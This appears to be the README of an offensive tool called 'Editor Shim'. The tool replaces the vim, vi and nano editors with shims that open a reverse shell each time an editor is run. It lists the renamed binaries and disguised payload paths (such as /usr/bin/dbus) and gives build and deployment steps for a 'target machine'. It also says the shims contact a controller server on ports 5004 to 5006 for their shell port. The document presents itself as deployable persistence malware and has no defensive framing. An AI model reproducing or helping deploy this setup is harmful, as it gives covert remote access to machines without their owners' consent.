# Editor Shim

Tool that shims three command-line text editors: `vim`, `vi`, and `nano`, establishing a reverse shell every time these commands are run. 

## Files created/modified

This project moves the following files:
```
/usr/bin/vi -> /usr/bin/qvr
/usr/bin/vim -> /usr/bin/vux
/usr/bin/nano -> /usr/bin/idb
```

And creates the following files:

```bash
# PID files
/var/lib/vim/vi-process # Vi
/var/lib/vim/process # Vim
/var/lib/dbus/machine-process # Nano

# Payload files
/usr/bin/dvi # Vi
/usr/bin/vuxf # Vim
/usr/bin/dbus # Nano

# Error output files
/var/lib/vim/vi-err # Vi
/var/lib/vim/err # Vim
/var/lib/dbus/err # Nano
```

## Usage/Deployment

To compile the binaries, run `build.sh`. Afterwards, execute the created `[name].payload` files on the target machine to automatically install them.

The shims contact the server on ports `5004`, `5005`, and `5006` for `vi`, `vim`, and `nano` respectively in order to receive their ip-based reverse shell port.

This project requres an instance of `c-server` (located under the `shim_handler` folder) to be running. Please refer to the documentation of `c-server` for more information.